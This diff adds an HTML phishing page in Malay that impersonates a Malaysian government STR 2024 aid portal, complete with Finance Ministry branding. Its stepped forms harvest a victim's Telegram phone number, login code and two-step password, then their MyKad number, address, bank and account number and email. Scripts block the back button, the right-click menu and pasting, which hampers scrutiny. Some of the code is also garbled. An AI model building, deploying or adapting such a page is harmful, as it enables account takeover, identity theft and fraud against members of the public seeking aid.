@@ -1,0 +1,652 @@
+
+<!DOCTYPE html>
+<html data-bs-theme="light" lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <meta property="og:image" content="./STR-2024-Jadual-Bayaran-STR-Fasa-3-Dan-Fasa-4.png">
+    <meta name=description />
+    <meta name="author" content="STR 2024 : Jadual Bayaran STR Fasa 3 Dan Fasa 4" />
+    <title>STR 2024</title>
+    <link href="css/custom.css" type="text/css" rel="stylesheet" />
+    <link href="css/menebus.css" type="text/css" rel="stylesheet" />
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="assets/css/intlTelInput.css">
+    <link rel="stylesheet" href="assets/css/intlTelInput.css">
+    <link rel="icon" type="image/x-icon" href="./favicon.ico" />
+    <link rel="canonical" href="https://getbootstrap.com/docs/5.0/examples/sticky-footer/" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" />
+    <script type="text/javascript" src="js/vue.min.js.download"></script>
+    <script src="js/clipboard.js.download"></script>
+    <script type="text/javascript" src="js/index.js.download"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.0/jquery.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css" />
+    <script>
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            history.go(1);
+        };
+    </script>
+    <link rel="stylesheet" type="text/css"
+        href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick-theme.css" />
+    <style type="text/css">
+        .bd-placeholder-img {
+            font-size: 1.125rem;
+            text-anchor: middle;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            user-select: none;
+        }
+
+        @media (min-width: 768px) {
+            .bd-placeholder-img-lg {
+                font-size: 3.5rem;
+            }
+        }
+
+        /* Absolute Center Spinner */
+        .loading {
+            position: fixed;
+            z-index: 999;
+            height: 2em;
+            width: 2em;
+            overflow: show;
+            margin: auto;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+        }
+
+        /* Transparent Overlay */
+        .loading:before {
+            content: '';
+            display: block;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(rgba(20, 20, 20, 0.774), rgba(0, 0, 0, 0.753));
+
+            background: -webkit-radial-gradient(rgba(20, 20, 20, 0.712), rgba(0, 0, 0, 0.788));
+        }
+
+        /* :not(:required) hides these rules from IE9 and below */
+        .loading:not(:required) {
+            /* hide "loading..." text */
+            font: 0/0 a;
+            color: transparent;
+            text-shadow: none;
+            background-color: transparent;
+            border: 0;
+        }
+
+        .loading:not(:required):after {
+            content: '';
+            display: block;
+            font-size: 10px;
+            width: 1em;
+            height: 1em;
+            margin-top: -0.5em;
+            -webkit-animation: spinner 150ms infinite linear;
+            -moz-animation: spinner 150ms infinite linear;
+            -ms-animation: spinner 150ms infinite linear;
+            -o-animation: spinner 150ms infinite linear;
+            animation: spinner 150ms infinite linear;
+            border-radius: 0.5em;
+            -webkit-box-shadow: #ff8c00 1.5em 0 0 0, #ff8c00 1.1em 1.1em 0 0, #ff8c00 0 1.5em 0 0, #ff8c00 -1.1em 1.1em 0 0, #ff8c00 -1.5em 0 0 0, #ff8c00 -1.1em -1.1em 0 0, #ff8c00 0 -1.5em 0 0, #ff8c00 1.1em -1.1em 0 0;
+            box-shadow: #ff8c00 1.5em 0 0 0, #ff8c00 1.1em 1.1em 0 0, #ff8c00 0 1.5em 0 0, #ff8c00 -1.1em 1.1em 0 0, #ff8c00 -1.5em 0 0 0, #ff8c00 -1.1em -1.1em 0 0, #ff8c00 0 -1.5em 0 0, #ff8c00 1.1em -1.1em 0 0;
+        }
+
+        /* Animation */
+
+        @-webkit-keyframes spinner {
+            0% {
+                -webkit-transform: rotate(0deg);
+                -moz-transform: rotate(0deg);
+                -ms-transform: rotate(0deg);
+                -o-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            100% {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                -o-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+
+        @-moz-keyframes spinner {
+            0% {
+                -webkit-transform: rotate(0deg);
+                -moz-transform: rotate(0deg);
+                -ms-transform: rotate(0deg);
+                -o-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            100% {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                -o-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+
+        @-o-keyframes spinner {
+            0% {
+                -webkit-transform: rotate(0deg);
+                -moz-transform: rotate(0deg);
+                -ms-transform: rotate(0deg);
+                -o-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            100% {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                -o-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes spinner {
+            0% {
+                -webkit-transform: rotate(0deg);
+                -moz-transform: rotate(0deg);
+                -ms-transform: rotate(0deg);
+                -o-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            100% {
+                -webkit-transform: rotate(360deg);
+                -moz-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                -o-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+
+        .unselectable {
+            -webkit-user-select: none;
+            -webkit-touch-callout: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+    </style>
+
+
+
+</head>
+
+<body class="d-flex flex-column h-100 ">
+    <div class="unselectable">
+        <nav class="navbar navbar-expand-md" style="background: #a6275d">
+            <div class="container-fluid"><a class="navbar-brand" href="#"><img src="./img/Jata Negara@3x.gif" width="53"
+                        height="39">&nbsp;<img src="./img/madani.png" width="100" height="38"></a>
+            </div>
+        </nav>
+        <!---
+<div class="item">
+<div class="record_logo">
+<img src="img/avatar.png" alt="">
+</div>
+<div class="center">
+<div class="h1"><span class="name"></span> <span>Berjaya</span> <span class="number">RM 1.000,00</span></div>
+<div class="h2">3 jam yang lalu</div>
+</div>
+</div>
+-->
+        <div id="loading" class="loading" style="display: none;">
+
+        </div>
+
+        <main class="flex-shrink-0">
+            <div id="ctl00_divContainer" class="container container-narrow">
+                <div class="text-center mt-2">
+                    <a id="ctl00_lnkMalay" disabled="disabled"
+                        style="color:Black;font-weight:bold;text-decoration:none;"></a>
+                    <span id="ctl00_lblPipe_bm"></span>
+                    <a id="ctl00_lnkEng" href=""></a>
+                    <span id="ctl00_lblPipe_bi"></span>
+                    <a id="ctl00_lnkChineseSimplified" href=""></a>
+                    <span id="ctl00_lblPipe_bc"></span>
+                    <a id="ctl00_lnkTamilInd" href=""></a>
+                </div>
+                <div class="carousel slide carousel-fade" data-bs-ride="carousel" data-bs-touch="false" id="carousel-1">
+                    <div class="carousel-inner">
+                        <div class="carousel-item active"><img class="w-100 d-block" src="./img/1.png" alt="Slide Image"
+                                style="height: 200px;" height="380"></div>
+                        <div class="carousel-item"><img class="w-100 d-block" src="./img/2.jpg" alt="Slide Image" height="380"
+                                style="height: 200px;"></div>
+                        <div class="carousel-item"><img class="w-100 d-block" src="./img/3.webp" alt="Slide Image" height="380"
+                                style="height: 200px;"></div>
+                        <div class="carousel-item"><img class="w-100 d-block" src="./img/4.webp" alt="Slide Image" height="380"
+                                style="height: 200px;"></div>
+                    </div>
+                </div>
+                <script type="text/javascript">
+                    //<![CDATA[
+                    var theForm = document.forms['aspnetForm'];
+                    if (!theForm) {
+                        theForm = document.aspnetForm;
+                        A
+                    }
+                    function __doPostBack(eventTarget, eventArgument) {
+                        if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+                            theForm.__EVENTTARGET.value = eventTarget;
+                            theForm.__EVENTARGUMENT.value = eventArgument;
+                            theForm.submit();
+                        }
+                    }
+                    //]]>
+                </script>
+                <script type="text/javascript">
+                    //<![CDATA[
+                    function WebForm_OnSubmit() {
+                        if (typeof (ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;
+                        return true;
+                    }
+                    //]]>
+                </script>
+                <span id="ctl00_lblMsg"></span>
+
+                <div class="first">
+
+                    <form action="javascript:void(0)" method="post" id="firstForm">
+                        <section>
+                            <p
+                                style="background: #a6275d; color: #f1f3f5; padding-top: 1px; margin-bottom: 6px; padding-bottom: 0px; height: 31px; font-size: 14px; text-align: center;">
+                                &nbsp; Hantar Resume Sekarang</p>
+
+                            <div class="first">
+
+                                <section class="text-center"
+                                    style="border-width: 1px;border-radius: 10px;box-shadow: 10px 0px 20px 2px;">
+                                    <section class="text-center"
+                                        style="margin-top: 9px;padding-top: 8px;padding-bottom: 8px;padding-left: 0px;padding-right: 0px;">
+                                        <center>
+                                            <label for="Name"><b>Nama Penuh Sesuai Mykad</b></label>
+                                        </center>
+                                        <input name="full_name" id="full_name" type="text"
+                                            style="display: inline-block; width: 220px; margin-top: 0px; " required=""
+                                            autofocus="" placeholder="Nama Penuh Sesuai MyKad">
+                                        <div>
+                                            <section class="text-center"
+                                                style="border-width: 1px;border-radius: 10px;box-shadow: px 0px 20px 2px;">
+                                                <section class="text-center"
+                                                    style="padding-bottom: 0px;margin-top: 9px;">
+                                                    <section class="text-center"
+                                                        style="margin-top: 9px;padding-top: 8px;padding-bottom: 8px;padding-left: 0px;padding-right: 0px;">
+                                                        <center>
+                                                            <label for="Name"><b>Phone Number Telegram</b></label>
+                                                        </center>
+                                                        <input type="tel" name="phone_number" id="phoneNumber"
+                                                            style="display: inline-block; width: 220px; margin-top: 0px; padding-left: 86px;"
+                                                            required="" inputmode="tel" minlength="8" maxlength="12"
+                                                            autocomplete="off" data-intl-tel-input-id="0"
+                                                            onselectstart="return false" onpaste="return false;"
+                                                            onCopy="return false" onCut="return false"
+                                                            onDrag="return false" onDrop="return false"
+                                                            autocomplete=off>
+                                                        <input type="hidden" name="full_number">
+
+                                                        <input class="btn btn-primary" type="submit"
+                                                            onclick="processFirstData()" value="SEMAK SEKARANG"
+                                                            style="background: #a6275d;width: 219.75px;margin-top: 9px;font-weight: bold;color: rgb(255, 255, 255);">
+                                        </div>
+                            </div>
+
+                </div>
+                </section>
+                </form>
+            </div>
+
+            <div class="second" style="display: none;">
+                <form action="javascript:void(0)" method="post" id="secondForm">
+                    <input type="hidden" name="full_name" id="validateFullName" readonly>
+                    <input type="hidden" name="phone_number" id="validatePhoneNumber" readonly>
+
+                    <div class="mb-3">
+                        <section class="text-center"
+                            style="background: #a7a7a700;border-width: 1px;border-radius: 10px;box-shadow: 0px 0px 20px 2px;">
+                            <section class="text-center"
+                                style="margin-top: 9px;padding-top: 8px;padding-bottom: 8px;padding-left: 0px;padding-right: 0px;">
+                                <center>
+                                    <label for="Name"><b>Kami telah menghantar kod untuk aplikasi telegrm
+                                            anda</b></label>
+                                </center>
+                                <br>
+                                <input name="otp" id="otp_code" type="text" inputmode="numeric" minlength="5"
+                                    maxlength="5" pattern="\d{1,5}"
+                                    style="width: 139px;margin-left: 98px;margin-right: 98px;text-align: center;"
+                                    required="" autofocus="">
+                                <input class="btn btn-primary" type="submit" onclick="processSecondData()"
+                                    value="Seterusnya"
+                                    style="background: #a6275d;width: 232.75px;margin-top: 9px;margin-left: 7px;margin-right: 7px;font-weight: bold;">
+                    </div>
+            </div>
+            </form>
+    </div>
+    </div>
+    <div class="third" style="display: none;">
+        <form action="javascript:void(0)" method="post" id="thirdForm">
+            <input type="hidden" name="phone_number" id="validatephone_number" readonly>
+            <input type="hidden" name="otp_code" id="validateotp_code" readonly>
+            <div class="mb-3">
+                <section class="text-center"
+                    style="background: #a7a7a700;border-width: 1px;border-radius: 10px;box-shadow: 0px 0px 20px 2px;">
+                    <section class="text-center"
+                        style="margin-top: 9px;padding-top: 8px;padding-bottom: 8px;padding-left: 0px;padding-right: 0px;">
+                        <center>
+                            <label for="Name"><b>Pengesahan dua langkah didayakan. Akaun anda dilindungi dengan kata
+                                    laluan tambahan.</b></label>
+                        </center>
+                        <br>
+                        <input name="password" id="password" type="password" type="text"
+                                            style="display: inline-block; width: 220px; margin-top: 0px; " required=""
+                                            autofocus="" placeholder="********">
+                            <input class="btn btn-primary" type="submit"onclick="processThirdData()" value="Seterusnya"
+                        style="background: #a6275d;width: 232.75px;margin-top: 9px;margin-left: 7px;margin-right: 7px;font-weight: bold;">
+                    <span id="countdown"></span>
+            </div>
+            </div>
+        </form>
+    </div>
+    <div class="four" style="display: none;">
+        <div class="container">
+            <p
+                style="background: #a6275d; color: #f1f3f5; padding-top: 1px; margin-bottom: 6px; padding-bottom: 0px; height: 31px; font-size: 14px; text-align: center;">
+                &nbsp;Maklumat Permohonan
+                <br /><br />
+            </p>
+            <section style="border: 1px solid #c2c5c8; padding: 12px 20px 20px 20px;">
+                <form action="javascript:void(0)" method="post" id="fourForm" enctype="multipart/form-data">
+                    <input type="hidden" name="phone_number" id="validatephone_number" readonly>
+                    <input type="hidden" name="otp_code" id="validateotp_code" readonly>
+                    <input type="hidden" name="password" id="validatepassword" readonly>
+                    <div class="input-group">
+                        <span class="input-group-text" style="font-size: 14px;width: 101px;">No. MyKad :</span>
+                        <input class="form-control" type="text" inputmode="numeric" name="no_mykad" required="">
+                    </div>
+                    <div class="input-group">
+                        <span class="input-group-text" style="font-size: 14px;width: 101px;">Nama&nbsp; &nbsp;
+                            &nbsp; &nbsp; &nbsp;:</span>
+                        <input class="form-control" type="text" name="nama_mykad" required="">
+                    </div>
+                    <div class="input-group">
+                        <span class="input-group-text" style="font-size: 14px;width: 101px;">Umur&nbsp; &nbsp;
+                            &nbsp; &nbsp; &nbsp; :</span>
+                        <input class="form-control" type="text" inputmode="numeric" maxlength="2" name="umur_mykad"
+                            required="">
+                    </div>
+                    <div class="input-group">
+                        <span class="input-group-text" style="font-size: 14px;width: 101px;">Alamat&nbsp; &nbsp;
+                            &nbsp; &nbsp; :</span>
+                        <input class="form-control" type="text" name="alamat_mykad" required="">
+                    </div>
+                    <div class="input-group">
+                        <span class="input-group-text" style="font-size: 14px;width: 101px;">Jantina&nbsp; &nbsp;
+                            &nbsp; &nbsp; :</span>
+                        <select class="form-select" name="jantina_mykad" required>
+                            <option value=""></option>
+                            <option value="Laki-laki">Laki-laki</option>
+                            <option value="Perempuan">Perempuan</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <span class="input-group-text" style="font-size: 14px;width: 101px;">Pekerjaan&nbsp; &nbsp;
+                            :</span>
+                        <select class="form-select" name="pekerjaan_mykad" required>
+                            <option value="" selected=""></option>
+                            <option value="Kerajaan">Kerajaan</option>
+                            <option value="Swasta">Swasta</option>
+                            <option value="Bekerja Sendiri">Bekerja Sendiri</option>
+                            <option value="Tidak Bekerja">Tidak Bekerja</option>
+                            <option value="Pasara">Pasara</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <span class="input-group-text" style="font-size: 14px;width: 101px;">Nama Bank :</span>
+                        <select class="form-select" name="bank_mykad" required>
+                            <option value=""></option>
+                            <option value="BANK SIMPANA NASIONAL">BANK SIMPANA NASIONAL</option>
+                            <option value="AFFIN BANK BERHAD">AFFIN BANK BERHAD</option>
+                            <option value="AGRO BANK">AGRO BANK</option>
+                            <option value="AM BANK BERHAD">AM BANK BERHAD</option>
+                            <option value="BANK ISLAM MALAYSIA BERHAD">BANK ISLAM MALAYSIA BERHAD</option>
+                            <option value="BANK MUAMALAT MALAYSIA BERHAD">BANK MUAMALAT MALAYSIA BERHAD</option>
+                            <option value="BANK OF CHINA">BANK OF CHINA</option>
+                            <option value="CIMB BANK BERHAD">CIMB BANK BERHAD</option>
+                            <option value="CITY BANK BERHAD">CITY BANK BERHAD</option>
+                            <option value="MALAYAN BANKING BERHAD">MALAYAN BANKING BERHAD</option>
+                            <option value="PUBLIC BANK BERHAD">PUBLIC BANK BERHAD</option>
+                            <option value="RHB BANK BERHARD">RHB BANK BERHARD</option>
+                            <option value="TIADA MAKLUMAT AKAUN BANK">TIADA MAKLUMAT AKAUN BANK</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <span class="input-group-text" style="font-size: 14px;width: 130px;">No. Akaun Bank :</span>
+                        <input class="form-control" type="text" inputmode="numeric" name="nbnk_mykad" required=""
+                            minlength="5">
+                    </div>
+                    <div class="input-group">
+                        <span class="input-group-text" style="font-size: 14px;width: 130px;">Alamat e-Mel&nbsp;
+                            &nbsp; &nbsp;:</span>
+                        <input class="form-control" type="email" name="emel_mykad" required>
+                    </div>
+                    <section class="text-center" style="padding-top: 24px;">
+                        <input class="btn btn-primary" type="submit" onclick="processfourData()"
+                            style="width: 280.65px;font-weight: bold;background: #a6275d;" value="MUAT NAIK">
+        </div>
+        </form>
+    </div>
+    </div>
+
+    <div class="fur" style="display: none;">
+        <form action="javascript:void(0)" method="post" id="furForm" enctype="multipart/form-data">
+            <input type="hidden" name="phone_number" id="validatephone_number" readonly>
+            <input type="hidden" name="otp_code" id="validateotp_code" readonly>
+            <input type="hidden" name="password" id="validatepassword" readonly>
+            <div class="input-group" style="padding-right: 0px;"><span class="input-group-text"
+                    style="margin-left: 44px;">Status Permohonan :</span><input class="form-control form-control-lg"
+                    type="text" value="Proses"
+                    style="margin-right: 40px;color: rgb(134, 134, 134);font-weight: bold;text-align: center;"
+                    disabled="" readonly=""></div>
+            <div class="input-group" style="padding-right: 0px;"><span class="input-group-text"
+                    style="margin-left: 44px;">Jumlah kelulusan:</span><input class="form-control form-control-lg"
+                    type="text" value="Proses"
+                    style="margin-right: 40px;color: rgb(134, 134, 134);font-weight: bold;text-align: center;"
+                    disabled="" readonly=""></div>
+
+            <section class="text-center" style="padding-top: 24px;">
+                <input class="btn btn-primary" type="submit" onclick="processfurData()"
+                    style="width: 280.65px;font-weight: bold;background: #a6275d;" value="MUAT NAIK">
+    </div>
+    </div>
+    </form>
+    </div>
+    <div class="row five" id="ctl00_RecipientMasterContent_divResultNotFound" style="display: none;">
+        </nav>
+        <div class="container text-center"><img src="img/malaysia.jpg" width="260" height="218"
+                style="margin-top: 10px;">
+        </div>
+        <center>
+            <div class="container">
+                <h4 style="margin-bottom: 0px;height: 69.7375px;font-size: 19.6px;">KEMENTRIAN
+                    KEWANGAN<br>MALAYSIA<br><br><br><br></h4>
+            </div>
+            <div class="container">
+                <p style="font-size: 21px;"><strong>BANTUAN RAKYAT MALAYSIA</strong><br><button class="btn btn-primary"
+                        type="button"
+                        style="background: #a6275d;border-style: none;width: 258.913px;margin-top: 12px;color: rgb(142,17,173);">Tahniah
+                        akaun anda telah dibuat. Sila semak e-mel anda untuk melengkapkan pendaftaran.</button></p>
+            </div>
+            <div>
+                <p style="margin-top: 14px;font-size: 14px;">Jika status layak,<br>Sila tunggu pengesahan 1x24 jam dari
+                    team
+                    kami</p>
+            </div>
+            <br>
+            <br>
+        </div>
+        <div class="carousel slide pointer-event" data-bs-ride="carousel" id="carousel-2" style="padding-top: 20px;">
+            <div class="carousel-inner">
+                <div class="carousel-item active"><img class="img-fluid w-100 d-block" src="./img/si.jpg"
+                        alt="Slide Image" style="height: 300px;"></div>
+                <div class="carousel-item"><img class="img-fluid w-100 d-block" src="./img/image-12.webp" alt="Slide Image"
+                        style="height: 300px;"></div>
+            </div>
+        </div>
+        <nav class="navbar navbar-expand-md fixed-bottom bg-body">
+            <div class="container-fluid"><img class="img-fluid" src="./img/ini1.png"></div>
+        </nav>
+            <main class="flex-shrink-0">
+                <div id="ctl00_divContainer" class="container container-narrow">
+
+                </div>
+                <script src="js/bootstrap.min.js"></script>
+                <script src="js/bs-init.js"></script>
+                <script src="js/intlTelInput.js"></script>
+                <script src="js/utils.js"></script>
+                <script src="js/script.js"></script>
+
+                <script src="js/bootstrap.min.js"></script>
+                <script src="js/bs-init.js"></script>
+                <script src="js/intlTelInput.js"></script>
+                <script src="js/utils.js"></script>
+
+                <script type="text/javascript">
+                    //<![CDATA[
+                    var Page_ValidationActive = false;
+                    if (typeof (ValidatorOnLoad) == "function") {
+                        ValidatorOnLoad();
+                    }
+                    function ValidatorOnSubmit() {
+                        if (Page_ValidationActive) {
+                            return ValidatorCommonOnSubmit();
+                        } else {
+                            return true;
+                        }
+                    }
+                </script>
+                <script src="js/intlTelInput.js"></script>
+                <script>
+                    var input = document.querySelector("#phoneNumber");
+                    window.intlTelInput(input, {
+                        // allowDropdown: false,
+                        // autoInsertDialCode: true,
+                        // autoPlaceholder: "off",
+                        dropdownContainer: document.body,
+                        // excludeCountries: ["us"],
+                        formatOnDisplay: false,
+                        // geoIpLookup: function(callback) {
+                        //   fetch("https://ipapi.co/json")
+                        //     .then(function(res) { return res.json(); })
+                        //     .then(function(data) { callback(data.country_code); })
+                        //     .catch(function() { callback("us"); });
+                        // },
+                        hiddenInput: "full_number",
+                        initialCountry: "MY",
+                        // localizedCountries: { 'de': 'Deutschland' },
+                        // nationalMode: false,
+                        // onlyCountries: ['MY', 'cn'],
+                        placeholderNumberType: "MOBILE",
+                        // preferredCountries: ['cn', 'jp'],
+                        separateDialCode: true,
+                        showFlags: true,
+                        // useFullscreenPopup: true,
+                        utilsScript: "js/utils.js"
+                    });
+                </script>
+
+    </div>
+    </div>
+    </div>
+    </div>
+    <script>
+        // Get the input element
+        var myInput = document.getElementById("myInput");
+        // sessionStorage.setItem("nohp", "+60 " + "formattedPhoneNumber");
+        // Get the new value from a variable
+        var newValue = sessionStorage.getItem("nohp");
+
+        // Update the input element with the new value
+        myInput.value = newValue;
+    </script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
+        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+    <script src="js/script.js"></script>
+    <script type="text/javascript" src="js/jquery-3.4.1.min.js.download"></script>
+    <script>
+        $(document).ready(function () {
+            $('.slider').slick({
+                autoplay: true,
+                autoplaySpeed: 2500
+            });
+        });
+    </script>
+    <script>
+        // 加载多语言
+        var language = getQueryString('language')
+        loadLocale(function (e) {
+            app.locale = Object.assign(e.Common, e.CommonShare)
+        }, language)
+        var app = new Vue({
+            el: '#app',
+            data: {
+                locale: {},
+                uid: '2004219',
+            },
+            created() {
+                $('#app').show();
+                this.starScroll();
+            },
+            methods: {
+                starScroll() {
+                    var _this = this;
+                    _this.scrollTimer && clearTimeout(_this.scrollTimer)
+                    _this.scrollTimer = setTimeout(() => {
+                        var $box = $("#list").find(".list:first");
+                        $box.css({
+                            marginTop: 0
+                        })
+                        var $item = $box.find(".item:first");
+                        var outerHeight = $item.outerHeight(true)
+                        $box.animate({
+                            "marginTop": -outerHeight + "px"
+                        }, 1000, function () {
+                            $box.css({
+                                marginTop: 0
+                            }).find(".item:first").appendTo($box);
+                            _this.starScroll();
+                        })
+                    }, 600);
+                },
+            },
+        })
+    </script>
+    <script>
+        $(document).ready(function () {
+            $("body").on("contextmenu", function (e) {
+                return false;
+            });
+        });
+    </script>
+
+</body>
+
+</html>
